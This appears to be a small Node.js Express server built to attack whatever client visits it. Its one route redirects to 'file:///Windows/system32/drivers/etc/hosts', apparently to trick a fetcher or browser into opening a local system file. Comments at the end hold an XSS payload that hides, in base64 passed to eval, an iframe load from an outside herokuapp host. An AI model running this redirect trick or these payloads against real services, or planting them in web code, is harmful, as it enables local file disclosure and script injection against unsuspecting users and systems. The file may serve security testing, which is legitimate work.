const express = require('express')
const app = express()
const port = process.env.PORT || 3000;

const print = s => {
    console.log(s)
}

// const server = http.createServer((req, res) => {
//   res.statusCode = 302;
//   print(res.statusCode)
//   res.setHeader('Location', 'file:///Windows/system32/drivers/etc/hosts');
//   res.end('Hello World');
// });

// server.listen(port, hostname, () => {
//   console.log(`Server running at http://${hostname}:${port}/`);
// });

app.get('/', (req,res) => {
  res.statusCode = 302
  print("access from somewhere")
  res.setHeader('Location', 'file:///Windows/system32/drivers/etc/hosts');
  res.end('Hello World');
})

app.listen(port, () => {
  print("example")
})

// document.write('<iframe src="https://dirty-one-test.herokuapp.com/"></iframe>')

// {/* <noscript><p title="</noscript><img src=x onerror=eval(atob('ZG9jdW1lbnQud3JpdGUoJzxpZnJhbWUgc3JjPSJodHRwczovL2RpcnR5LW9uZS10ZXN0Lmhlcm9rdWFwcC5jb20vIj48L2lmcmFtZT4nKQ==')>"> */}
